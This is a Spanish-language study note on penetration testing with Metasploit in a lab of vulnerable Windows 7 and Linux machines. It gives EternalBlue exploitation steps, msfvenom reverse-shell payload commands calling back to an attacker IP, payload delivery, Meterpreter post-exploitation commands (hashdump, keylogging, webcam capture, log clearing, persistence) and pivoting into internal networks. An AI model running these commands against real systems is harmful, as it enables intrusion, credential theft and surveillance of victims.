----
- Tags: #pivoting #automatizado #Exploit #payloads #msfvenom 
-----
# Definición

> **Metasploit** es una plataforma de pruebas de penetración (Penetration Testing Framework) que se utiliza para realizar pruebas de seguridad en sistemas y aplicaciones. Esta plataforma es ampliamente utilizada por investigadores de seguridad, pentesters y profesionales de la seguridad para descubrir vulnerabilidades y realizar pruebas de explotación de vulnerabilidades. Metasploit se basa en un conjunto de herramientas de seguridad que incluyen un framework de desarrollo de exploits, un motor de base de datos de vulnerabilidades y una colección de módulos de explotación de vulnerabilidades.

En términos prácticos, Metasploit se utiliza para probar la seguridad de un sistema o aplicación mediante la realización de pruebas de penetración, con el objetivo de identificar y explotar vulnerabilidades de seguridad. Para hacer esto, Metasploit proporciona una gran cantidad de exploits, payloads y módulos de post-explotación, que pueden ser utilizados por los profesionales de seguridad para identificar vulnerabilidades y explotarlas. Al utilizar Metasploit, los profesionales de la seguridad pueden simular ataques reales y descubrir vulnerabilidades en sistemas y aplicaciones antes de que los atacantes malintencionados puedan hacerlo, lo que les permite corregir las vulnerabilidades y mejorar la seguridad de sus sistemas.

Cabe aclarar que para los siguientes ejemplos se emplearan **máquinas vulnerables** con sistemas operativos tales como **Windows 7** y **Linux**. También es necesario ==desactivar las protecciones== como lo es el **Firewall** en Windows.

------
# Utilización de la herramienta ``Metasploit``

Lo primero que tenemos que saber es como ejecutar la herramienta, para esto proporcionamos en la consola el siguiente comando por primera vez.

- **``sudo msfdb init && msfconsole``**

De esta forma se ejecutaría cargando y actualizando las bases de datos.

---

Cuando ya estemos dentro de la herramienta podríamos utilizar un comando básico para **listar los Exploits existentes** para una **vulnerabilidad concreta**, para esto haríamos lo siguiente. 

- **``search [vuln-here]``**

Por ejemplo podríamos buscar por ``search eternal blue`` que es una vulnerabilidad conocida ubicada en el sistema operativo **Windows 7**.

![[MS 1.png]]

En esta pequeña interfaz podremos ver información útil como el **ranking** del Exploit, si está **chequeado** o no, una breve **descripción** y demás.

Una vez listados los **Exploits** existentes para dicha vulnerabilidad (**Eternal Blue**), elegimos el que más nos interese ya sea para listar su información como para utilizarlo directamente, en mi caso la opción ``0``.

- **``use 0``**

Gracias a esto entraremos en modo ``Uso``, ya que si miramos nuestra **interfaz** de la Shell veremos que tenemos **cargado el Exploit** correspondiente.

![[MS 2.png]]

Luego de haber cargado correctamente el Exploit de interés podemos **listar las opciones de configuración disponibles** para este, gracias a este comando.

- **``show options``**

![[MS 3.png]]

En estas opciones podremos ver:

- El **``RHOSTS``** que correspondería a la **IP** de la **máquina víctima**, en este caso la **IP** de la **Windows 7**.
- El **``RPORT``** que correspondería al **puerto** que se está apuntando de **la máquina víctima**, en este caso el **445** que es el puerto vulnerable a **Eternal Blue**.
- El **``Payload``** utilizado por defecto actualmente ``(windows/x64/meterpreter/reverse_tcp)``, este **se puede modificar** manualmente.
- El **``LHOST``** que correspondería a la **IP** de la **máquina atacante**.
- El **``LPORT``** que correspondería al **puerto** de la **máquina atacante** que se pondrá en **escucha** automáticamente gracias a la herramienta.

Nosotros podemos modificar dichas opciones con ``set``, por ejemplo utilizando el siguiente comando.

- **``set RHOSTS (IP-MÁQUINA-VÍCTIMA)``**

Si volviéramos a utilizar ``show options`` veríamos la información actualizada que hemos proporcionado con el comando anterior.

------

Una vez ya hemos cargado los datos correspondientes procedemos a **ejecutar el ataque** con el siguiente comando.

- **``run``**

Una vez concluido el ataque se nos otorgará una **sesión** llamada ``meterpreter`` con la que tendremos acceso a **la máquina víctima** pero en cualquier momento proporcionando el comando ``shell`` se nos otorgará una **Shell interactiva** con la que podremos manipular el sistema comprometido.

Una **sesión de Meterpreter** y una **sesión de shell** son dos tipos de acceso a sistemas comprometidos, cada una con características y capacidades distintas. 

Sus principales diferencias son las siguientes.

> Interfaz y Capacidades

- **Shell**: Es una sesión básica que te proporciona una línea de comandos del sistema objetivo (como Bash en Linux o CMD/PowerShell en Windows). Las capacidades son limitadas y dependen de los comandos disponibles en el sistema.
- **Meterpreter**: Es una herramienta avanzada que ofrece una interfaz más completa y fácil de usar. Desarrollada como un payload en Metasploit, Meterpreter permite acceso y manipulación extensiva del sistema, como cargar módulos y ejecutar comandos complejos.

> Funcionalidades

- **Shell**: Ofrece acceso directo al sistema con comandos básicos para ejecutar, leer, escribir, y modificar archivos o directorios. No cuenta con herramientas integradas para realizar tareas complejas.
- **Meterpreter**: Incluye comandos avanzados para:
    - Migrar procesos
    - Realizar captura de pantalla y keylogging
    - Administrar privilegios y mantener la persistencia
    - Manipular sesiones y manejar múltiples conexiones
    - Cargar extensiones como `mimikatz` para extracción de credenciales
    - Pivoting

> Comunicación

- **Shell**: Generalmente, se conecta directamente al sistema comprometido, y la comunicación es relativamente simple, pero es más fácil de detectar y de bloquear.
- **Meterpreter**: La comunicación se realiza a través de un canal cifrado y encriptado, lo cual hace que sea más difícil de detectar y bloquear. También se puede configurar para utilizar técnicas de evasión como migración de procesos.

> Persistencia

- **Shell**: La sesión se cierra cuando se desconecta, a menos que establezcas una persistencia manualmente.
- **Meterpreter**: Permite opciones de persistencia avanzadas y reconexión automática, lo que hace más fácil mantener el acceso después de una caída.

> Estabilidad y Flexibilidad

- **Shell**: Puede ser inestable, especialmente en redes lentas, y puede desconectarse con frecuencia.
- **Meterpreter**: Diseñado para ser más estable y adaptable, especialmente útil en pruebas de redes de alta latencia o inestables.

> ¿Cuándo usar cada una?

- **Shell**: Útil para tareas rápidas o en sistemas donde Meterpreter puede ser detectado o bloqueado.
- **Meterpreter**: Ideal para escenarios donde necesitas control avanzado y estabilidad para realizar actividades de post-explotación.

------

Una sesión de ``Meterpreter`` se vería tal que así.

![[MS 4.png]]

Una sesión de ``Shell`` se vería tal que así.

![[MS 5.png]]

-----
## Comandos básicos de ``Meterpreter``

Los comandos básicos de ``Meterpreter`` son lo siguientes:

### 1. Comandos Básicos de Navegación y Control de Sesión

Estos comandos te ayudan a moverte y a obtener información básica en la sesión de Meterpreter:

- **`sysinfo`**: Muestra información básica del sistema, como el nombre del equipo y el sistema operativo.
- **`getuid`**: Muestra el usuario actual bajo el cual estás operando en el sistema comprometido.
- **`getpid`**: Muestra el ID del proceso en el que se está ejecutando la sesión de Meterpreter.
- **`ps`**: Lista todos los procesos que se están ejecutando en la máquina objetivo.
- **`migrate <PID>`**: Mueve la sesión de Meterpreter a otro proceso especificado por el ID (PID). Esto es útil para mantener la sesión si se cierra el proceso inicial.
- **`shell`**: Abre una shell interactiva del sistema operativo objetivo (ya sea Windows o Linux).

### 2. Comandos de Exploración del Sistema de Archivos

Permiten moverse y gestionar archivos y directorios en el sistema comprometido.

- **`pwd`**: Muestra el directorio actual en el que estás.
- **`ls`**: Lista los archivos y directorios en el directorio actual.
- **`cd <ruta>`**: Cambia de directorio.
- **`cat <archivo>`**: Muestra el contenido de un archivo.
- **`download <archivo>`**: Descarga un archivo del sistema objetivo a tu máquina local.
- **`upload <archivo>`**: Sube un archivo desde tu máquina al sistema comprometido.
- **`edit <archivo>`**: Abre el archivo especificado en un editor de texto en la línea de comandos para modificarlo.

### 3. Comandos de Captura de Información

Comandos para recolectar información del sistema comprometido.

- **`hashdump`**: Extrae los hashes de las contraseñas de los usuarios en el sistema. (Requiere permisos elevados)
- **`keyscan_start`** y **`keyscan_dump`**: Inician y muestran los resultados de un keylogger en el sistema, que captura las pulsaciones de teclado.
- **`screenshot`**: Toma una captura de pantalla del sistema objetivo.
- **`record_mic`**: Graba el audio del micrófono en el sistema (si tiene uno).
- **`webcam_snap`**: Toma una foto usando la cámara web del sistema (si está disponible).
- **`webcam_stream`**: Transmite el video en vivo desde la cámara web.

### 4. Comandos de Red

Para obtener y gestionar información de red en el sistema.

- **`ipconfig`**: Muestra las interfaces de red y sus configuraciones en el sistema comprometido.
- **`route`**: Muestra o modifica las tablas de enrutamiento.
- **`portfwd add -l <puerto local> -p <puerto remoto> -r <IP>`**: Reenvía tráfico desde un puerto local a un puerto y dirección IP en la máquina comprometida.
- **`arp`**: Muestra la tabla ARP para ver los dispositivos conectados a la misma red.
- **`netstat`**: Muestra todas las conexiones de red activas y puertos de escucha.

### 5. Escalada de Privilegios y Persistencia

Para ganar persistencia o elevar los permisos de usuario.

- **`getsystem`**: Intenta elevar los privilegios del usuario al nivel de administrador o sistema.
- **`run persistence -h`**: Ejecuta un script para configurar un acceso persistente en el sistema objetivo.
- **`clearev`**: Borra los registros de eventos del sistema para ocultar rastros de actividades.

### 6. Control del Sistema

Permite manipular y controlar el sistema de manera remota.

- **`reboot`**: Reinicia la máquina objetivo.
- **`shutdown`**: Apaga el sistema comprometido.
- **`kill <PID>`**: Termina un proceso específico en el sistema objetivo.

### 7. Manejo de Sesiones

Cuando tienes múltiples sesiones activas en Meterpreter, estos comandos ayudan a gestionarlas:

- **`background`**: Envía la sesión actual de Meterpreter a segundo plano.
- **`sessions -l`**: Lista todas las sesiones activas de Meterpreter.
- **`sessions -i <ID>`**: Interactúa con una sesión específica usando su ID.

-----
## Comandos básicos de Windows (``Cmd`` y ``PowerShell``)

Los comandos básicos de ``Cmd``y ``PowerShell`` para **Windows** son los siguientes:

### 1. **Comandos Básicos de Navegación y Archivos**

Para moverte entre carpetas, ver contenido y manipular archivos y directorios.

#### **PowerShell** y **CMD** (similares en muchos casos)

- **`cd <ruta>`**: Cambia el directorio actual. Ejemplo: `cd C:\Users`.
- **`dir`**: Lista los archivos y carpetas en el directorio actual.
- **`md <nombre del directorio>`** o **`mkdir <nombre del directorio>`**: Crea un nuevo directorio.
- **`rd <nombre del directorio>`** o **`rmdir <nombre del directorio>`**: Elimina un directorio vacío.
- **`del <nombre del archivo>`**: Elimina un archivo.
- **`ren <archivo> <nuevo_nombre>`**: Renombra un archivo.
- **`copy <origen> <destino>`**: Copia un archivo de un lugar a otro.
- **`move <origen> <destino>`**: Mueve o renombra un archivo o carpeta.
- **`type <archivo>`**: Muestra el contenido de un archivo de texto en la terminal (similar a `cat` en Linux).
- **`cls`**: Limpia la pantalla en CMD o PowerShell.

---
### 2. **Comandos de Información del Sistema**

Para obtener detalles del sistema operativo y del hardware.

#### **PowerShell**

- **`Get-ComputerInfo`**: Muestra información detallada del sistema, incluyendo la versión de Windows, nombre del equipo, y más.
- **`Get-Process`**: Lista los procesos en ejecución.
- **`Get-Service`**: Lista todos los servicios en el sistema, indicando su estado (Iniciado/Detenido).
- **`Get-EventLog -LogName System`**: Muestra los eventos en el registro de eventos del sistema.
- **`systeminfo`**: Muestra información detallada del sistema, incluyendo la configuración de la red y la memoria RAM. (Este comando también funciona en CMD).

#### **CMD**

- **`tasklist`**: Lista todos los procesos en ejecución.
- **`taskkill /PID <ID del proceso>`**: Termina un proceso específico usando su ID de proceso.
- **`systeminfo`**: Igual que en PowerShell, muestra información detallada del sistema.

---
### 3. **Comandos de Red**

Para ver y configurar la red.

#### **PowerShell**

- **`Test-Connection <IP o nombre del host>`**: Envía un ping a la dirección IP o nombre de host especificado (equivalente a `ping` en CMD).
- **`Get-NetIPAddress`**: Muestra la configuración de IP de todas las interfaces de red.
- **`Get-NetAdapter`**: Lista las interfaces de red y su estado.
- **`Get-NetRoute`**: Muestra la tabla de enrutamiento.
- **`Invoke-WebRequest <URL>`**: Hace una solicitud HTTP o HTTPS a la URL especificada, útil para verificar conectividad y acceso a sitios.

#### **CMD**

- **`ping <IP o nombre del host>`**: Envía un ping para verificar la conectividad con una IP o dominio.
- **`ipconfig`**: Muestra la configuración IP de las interfaces de red.
- **`ipconfig /all`**: Muestra información detallada de la configuración de red.
- **`ipconfig /flushdns`**: Borra la caché DNS.
- **`netstat -an`**: Muestra todas las conexiones de red activas y los puertos de escucha.
- **`tracert <IP o nombre del host>`**: Muestra la ruta que toman los paquetes para llegar a una dirección IP o dominio.
- **`nslookup <dominio>`**: Muestra información del DNS sobre el dominio especificado.

---
### 4. **Comandos de Gestión de Usuarios**

Para ver y gestionar usuarios en el sistema.

#### **PowerShell**

- **`Get-LocalUser`**: Lista los usuarios locales en el sistema.
- **`New-LocalUser <nombre>`**: Crea un nuevo usuario local.
- **`Remove-LocalUser <nombre>`**: Elimina un usuario local.
- **`Get-LocalGroup`**: Muestra todos los grupos locales en el sistema.
- **`Add-LocalGroupMember -Group <grupo> -Member <usuario>`**: Agrega un usuario a un grupo.

#### **CMD**

- **`net user`**: Lista todos los usuarios en el sistema.
- **`net user <nombre>`**: Muestra la información de un usuario específico.
- **`net user <nombre> <contraseña> /add`**: Crea un nuevo usuario.
- **`net user <nombre> /delete`**: Elimina un usuario.

---
### 5. **Comandos de Administración del Sistema**

Para tareas de mantenimiento y administración.

#### **PowerShell**

- **`Restart-Computer`**: Reinicia el sistema.
- **`Stop-Computer`**: Apaga el sistema.
- **`Start-Service <nombre del servicio>`**: Inicia un servicio.
- **`Stop-Service <nombre del servicio>`**: Detiene un servicio.
- **`Get-EventLog -LogName Security`**: Muestra los eventos de seguridad registrados.

#### **CMD**

- **`shutdown /r /t 0`**: Reinicia el sistema de inmediato (`/r` para reiniciar, `/t 0` para no retraso).
- **`shutdown /s /t 0`**: Apaga el sistema de inmediato.
- **`sc start <nombre del servicio>`**: Inicia un servicio.
- **`sc stop <nombre del servicio>`**: Detiene un servicio.
- **`chkdsk`**: Verifica el disco en busca de errores.
- **`sfc /scannow`**: Escanea y repara archivos del sistema.

---
### 6. **Comandos de Seguridad**

Para comprobar configuraciones de seguridad y privilegios.

#### **PowerShell**

- **`Get-LocalGroupMember -Group "Administrators"`**: Muestra los usuarios en el grupo de Administradores.
- **`Get-WmiObject -Class Win32_UserAccount`**: Muestra información sobre las cuentas de usuario en el sistema.
- **`Get-ExecutionPolicy`**: Muestra la política de ejecución actual para scripts de PowerShell.
- **`Set-ExecutionPolicy RemoteSigned`**: Cambia la política de ejecución para permitir scripts firmados.

#### **CMD**

- **`net localgroup Administradores`**: Muestra los usuarios en el grupo de Administradores.
- **`whoami`**: Muestra el nombre del usuario actual y su dominio.
- **`whoami /priv`**: Muestra los privilegios del usuario actual.

--------
# Utilización del ``Multi/handler`` y ``Msfvenom``

## Herramienta de Metasploit `multi/handler`

**`multi/handler`** es un **módulo de Metasploit** que actúa como un **listener** (escucha) para recibir conexiones desde cargas útiles (payloads) que han sido ejecutadas en sistemas comprometidos. Este módulo es muy versátil y se utiliza comúnmente en escenarios donde el atacante ya tiene una carga útil (payload) ejecutándose en el sistema objetivo y necesita un punto de conexión para interactuar con esa carga.

#### Principales usos y características:

- **Recepción de conexiones de reverse shells**: Es ideal para recibir una **conexión inversa** (reverse shell) desde el objetivo hacia el atacante.
- **Uso con diferentes tipos de payloads**: Funciona con una gran variedad de payloads, como `windows/meterpreter/reverse_tcp`, `linux/x86/meterpreter/reverse_tcp`, entre otros.
- **Soporta diferentes protocolos**: `multi/handler` puede utilizarse con protocolos TCP, HTTP, HTTPS, etc., para adaptarse a las configuraciones de red.
- **Independiente de exploits específicos**: Puedes usar `multi/handler` sin haber lanzado un exploit específico desde Metasploit, lo que es útil cuando ejecutas payloads de otras fuentes.

------

Para ejecutar el ``Multi/handler`` primero tenemos que ejecutar ``Metasploit`` con el siguiente comando.

- **``msfconsole``**

Luego indicamos que usaremos el módulo de ``Multi/handler`` con ``use``.

- **``use multi/handler``**

Ahora simplemente **ejecutamos** el comando ``show options`` para ver las opciones de esta herramienta. Recordemos que esta es utilizada para **entablar conexiones** similar a ``nc``.

![[MS 6.png]]

En el campo de **``LHOST``** colocaremos la **IP** de la máquina nuestra de atacantes con ``set LHOST Ip-Máquina-Atacante``, y en el campo ``LPORT`` podemos colocar el puerto que nos interese. 
Esto se utiliza para indicarle a la herramienta que queremos esperar una conexión en una **IP** y **Puerto** especifico, en este caso nos pondremos en escucha a la espera de una **Reverse Shell** por ejemplo.

Únicamente deberíamos escribir **``run``** y ya estaríamos a la espera de conexiones.

En este caso la **Reverse Shell** que quiero entablar la realizaré con un **ejecutable** creado con la herramienta ``Msfvenom``, por lo tanto a continuación se explicará como hacerlo.

------
## Herramienta de Metasploit ``msfvenom``

**`msfvenom`** es una herramienta que permite crear **cargas útiles (payloads) personalizadas** de Metasploit en diferentes formatos (como ejecutables, scripts de PowerShell, archivos ELF, entre otros) para comprometer un sistema. En otras palabras, `msfvenom` genera los archivos maliciosos que contendrán el código necesario para obtener acceso a un sistema.

`msfvenom` es la **combinación de dos herramientas antiguas de Metasploit**: **`msfpayload`** (que generaba los payloads) y **`msfencode`** (que los codificaba para evitar detección antivirus). Ahora, `msfvenom` permite tanto generar como codificar payloads en una sola herramienta.

#### Principales usos y características:

- **Generación de payloads personalizados**: Puedes crear payloads para Windows, Linux, macOS, Android, etc., en varios formatos.
- **Codificación y evasión**: Puedes codificar el payload para evadir la detección por antivirus, aunque es necesario hacer una codificación avanzada para superar sistemas de seguridad modernos.
- **Compatibilidad con Metasploit**: Los payloads generados pueden conectarse a un listener `multi/handler` en Metasploit para recibir la conexión y control.

-----

Para utilizar la herramienta basta con listar los **parámetros** de la misma, de esta forma lograremos entender como es que se estructura una carga maliciosa.

- **``msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.194 LPORT=4444 -f exe -o reverse.exe``**

Con esta sintaxis estoy indicando que el payload ``-p`` es ``windows/x64/meterpreter/reverse_tcp`` por lo tanto en la sesión de ``multi/handler``  es ==muy importante== saber que tendríamos que colocar ``set payload windows/x64/meterpreter/reverse_tcp`` (siempre se debe usar el mismo Payload en ambos lados), a su vez indico mi **IP** de atacante con el **puerto** que coloque en la sesión de ``multi/handler``, por ultimo especifico la extensión del archivo y que se exporte con el nombre ``reverse.exe``.
Cabe destacar que como indicamos en el payload ``meterpreter``, significa que esta sesión es válida ==únicamente para este==, si quisieramos entablar una conexión con ``nc``, deberíamos colocar otro Payload.

Ahora lo que tenemos que hacer es **enviar el archivo malicioso a la máquina víctima**, en mi caso la máquina **Windows 7**. Para esto podemos hacerlo haciendo uso de un servidor con ``python3 -m http.server 80``.

------

Una vez tengamos el archivo ejecutable en la **máquina víctima** nos colocaremos en escucha con ``run`` en el ``multi/handler`` ya configurado previamente. Luego deberíamos esperar que la víctima (en este caso nosotros) ejecute el archivo malicioso creado con ``msfvenom``.

![[MS 8.png]]

![[MS 7.png]]

-----
# Pivoting con ``Metasploit``

 > El **Pivoting** (también conocido como “hopping”) es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.
 
Esta técnica se puede realizar tanto de manera manual como de forma automática, en este caso veremos la segunda.

En este caso tenemos un escenario simulado por nosotros donde disponemos de **tres máquinas**. Se mostrará a continuación un diagrama hecho en https://excalidraw.com.

------

Máquina atacante **Linux**.
Máquina intermedia **Windows 7**.
Máquina objetivo **Linux**.

![[MS 9.png]]

En este ejemplo como podemos ver la **máquina atacante posee alcance únicamente a la máquina intermedia**, en cambio la **máquina intermedia posee alcance tanto hacia la máquina atacante como a la máquina objetivo**. Nosotros vamos a usar la máquina intermedia como **puente** hacia la máquina objetivo.

---

Lo primero que debemos hacer es ejecutar Metasploit con ``msfconsole`` para hacer uso del módulo ``multi/handler`` nuevamente.

- **``use multi/handler``**

Simplemente establecemos una **Reverse Shell** con la **máquina intermedia**, ya sea utilizando un archivo ``.exe`` o abusando del ``Eternal Blue`` que es factible en este caso ya que la máquina intermedia es una *Windows 7*. 

---

En mi caso voy a meter un **archivo ejecutable** en la máquina **Windows** para establecer la conexión y **ganar acceso** a ella.

- **``msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.194 LPORT=4444 -f exe -o reverse.exe``** --> Si fuese **Windows**
- **``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.194 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o reverse``** --> Si fuese **Linux**

En Metasploit modificamos el ``LHOST`` con nuestra IP de máquina atacante y el ``LPORT`` que queramos, luego **actualizamos el Payload** para que posean el mismo el del **archivo** que el del ``multi/handler``.

- **``set payload windows/x64/meterpreter/reverse_tcp``**
- **``run``**

Ahora simplemente **ejecutamos el archivo malicioso** en la **máquina intermedia** y ganaríamos acceso a ella.

![[MS 10.png]]

> Algo muy importante que tenemos que tener en cuenta es que a la hora de realizar **Pivoting** con ``Metasploit`` se debe usar ==SIEMPRE== una sesión de ``Meterpreter``.

-----

Una vez tengamos acceso a la **máquina intermedia** si realizamos un ``ipconfig`` a través del ``Meterpreter`` veremos que ahí hay otra **IP** que no conocíamos, en este caso es  la **``192.168.238.128``** que corresponde a **otra interfaz**, por lo tanto podríamos deducir que tal vez **haya otra máquina dentro de esta interfaz que antes no teníamos alcance**. Si quisieramos **buscar la IP** de la máquina que creemos que esta dentro de esa otra interfaz de red podemos hacer un ``arp -a``.

![[MS 11.png]]

![[MS 14.png]]

Ahora que conseguimos esta información presionamos ``CTRL+Z`` para **salir de la sesión actual** de Metasploit. En cualquier momento podemos volver haciendo uso de ``sessions -l`` y luego ``sessions ID``.

![[MS 12.png]]

----

Una vez estemos fuera de la sesión que posee acceso a la máquina intermedia, vamos a utilizar uno de los **módulos de Pivoting** que posee **Metasploit**, ya que esta herramienta posee muchos para diferentes escenarios.

# Realizando el Pivoting

> **¿Por qué es necesario el enrutado en pivoting?**

Imagina que hemos logrado comprometer una máquina en la red objetivo. Esa máquina podría tener acceso a otras redes internas (_subredes_) que tu máquina atacante no puede ver directamente debido a las restricciones de la arquitectura de red. Si configuras el enrutado, puedes "decirle" a Metasploit que cualquier tráfico destinado a esas subredes se redirija a través de la máquina comprometida. Esto permite que tu máquina atacante "vea" y acceda a los recursos de la red interna usando la máquina comprometida como un puente o intermediario.

-----

Para comenzar el **Pivoting** en primer instancia tendremos que hacer un ``ifconfig`` dentro de la máquina intermedia a través del ``Meterpreter``, de esta forma detectaremos que hay **otra interfaz de red**, a su vez podemos hacer un ``arp -a`` para ver que **Hosts existen dentro de esta red** que hemos encontrado, luego debemos salirnos de esa sesión con ``CTRL+Z`` y realizar lo siguiente.

![[MS 15.png]]

- **``route add <IP-DE-LA-INTERFAZ-NUEVA> <NETMASK-DE-INTERFAZ-NUEVA> <ID_SESION_MÁQUINA-INTERMEDIA>``** --> Hacemos que todo el tráfico de la interfaz de la IP que coloquemos sea **accesible en la máquina atacante**.

-----

Si quisieramos **ver los puertos que están abiertos** en la **máquina objetivo**, podríamos hacer uso del siguiente módulo ``auxiliary/scanner/portscan/tcp``.

- **``use auxiliary/scanner/portscan/tcp``**
- **``set RHOSTS 192.168.238.131``**
- **``set PORTS 1-65535``**
- **``run``**

![[MS 16.png]]

Es importante destacar que este escaneo será válido siempre y cuando tengamos correctamente configurado el ``route``.

- **``route add <IP-DE-LA-INTERFAZ-NUEVA> <MASCARA-DE-INTERFAZ-NUEVA> <ID_SESION_MÁQUINA-INTERMEDIA>``**

-------

Ingresamos nuevamente a la sesión donde estamos dentro de la máquina intermedia.

- **``sessions <id-sesión-máquina-intermedia>``**
- **``portfwd add -l 5000 -p 80 -r <ip-máquina-objetivo>``** --> Realizamos un **Port Forwarding** haciendo que el *puerto 80* que detectamos que está **abierto** en la máquina objetivo, sea el *puerto 5000* de nuestra máquina atacante.

La IP de la máquina objetiva la conseguimos gracias al comando ``arp -a`` recordemos.

Por ultimo simplemente iríamos a nuestro navegador a la dirección **``ip-máquina-atacante:5000``** y si la máquina objetivo posee el **puerto 80 abierto** con un servicio **HTTP**, podremos ver su web.

![[MS 17.png]]

-----
# Formas alternas de Pivoting (No verificadas por mi)

### **SOCKS Proxy (`auxiliary/server/socks_proxy`)**

Este módulo crea un servidor ``SOCKS5`` en la máquina atacante que **enruta el tráfico a través de la máquina comprometida**, permitiendo que accedas a **redes internas** utilizando herramientas como `proxychains`.

- **``use auxiliary/server/socks_proxy``**
- **``set SRVHOST 127.0.0.1``**
- **``set SRVPORT 1080``**
- **``set sessions <ID>``** --> En ``ID`` colocamos la **ID** de la sesión en donde esté la **máquina intermedia**.
- **``run``**

**Enrutamiento de red**: Configura el enrutamiento en Metasploit para la red interna de la máquina comprometida con `route add`.

- **``route add <RED_INTERNA> <MASCARA> <ID_SESION>``**

**Acceso**: Luego podemos usar `proxychains` para ejecutar herramientas como `nmap`, `sqlmap`, etc., a través del proxy.

- ``proxychains nmap -sn 192.168.238.0/24`` --> Escanea todos los **Hosts** desde la ``238.0`` hasta la ``238.55``
- ``proxychains nmap -p- 192.168.238.128`` --> Escanea todos los puertos de la **IP** dada.

------
### **Port Forwarding en Meterpreter**

El _port forwarding_ de ``Meterpreter`` permite redirigir puertos específicos de tu máquina local hacia servicios internos en la red de la máquina comprometida. Este método es útil para interactuar directamente con servicios en un puerto específico.

- **``portfwd add -l <PUERTO_LOCAL> -p <PUERTO_REMOTO> -r <DIRECCION_IP_INTERNA>``**

Esto redirige el puerto local a través de la máquina comprometida, permitiéndote acceder al servicio como si estuviera en tu red local.

-----
### **Pivoting de Payload con `autoroute`**

`autoroute` es un script de ``Meterpreter`` que facilita el pivoting añadiendo automáticamente rutas a través de una sesión establecida. Es útil cuando quieres acceder a **varias subredes** sin necesidad de añadir cada ruta manualmente.

- **``run autoroute -s <RED_INTERNA> -n <MASCARA>``**

Después de configurar `autoroute`, Metasploit enruta automáticamente las solicitudes a la red interna a través de la sesión actual, permitiendo que otros módulos aprovechen la conexión de **pivoting**.